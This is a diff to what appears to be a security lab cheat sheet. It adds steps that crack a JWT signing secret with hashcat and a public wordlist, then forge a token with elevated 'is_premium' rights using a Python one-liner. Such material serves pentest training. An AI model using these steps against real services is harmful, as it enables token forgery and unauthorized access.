@@ -782,6 +782,19 @@ hashcat -m 1000 -a 0 hash.txt rockyou.txt
 hashcat -m 1400 -a 0 hash.txt rockyou.txt
 ~~~
 
+### JWT(-m 16500) cracking
+
+~~~ bash
+curl -o /tmp/scraped-jwt-secrets.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/scraped-JWT-secrets.txt > /dev/null 2>&1
+hashcat -a 0 -m 16500 /tmp/jwt_to_crack.txt /tmp/scraped-jwt-secrets.txt
+~~~
+
+### Generating a New JWT
+
+~~~ bash
+python -c "import jwt, datetime; print(jwt.encode({'id':7,'first_name':'Learner','last_name':'Learner','email':'learner@test.internal','is_premium':True,'exp':int(datetime.datetime.now().timestamp() + 24*60*60)}, 'this-secret-strength-is-over-nine-thousand', algorithm='HS256'))"
+~~~
+
 ### Get cracked passwords
 
 ~~~ bash
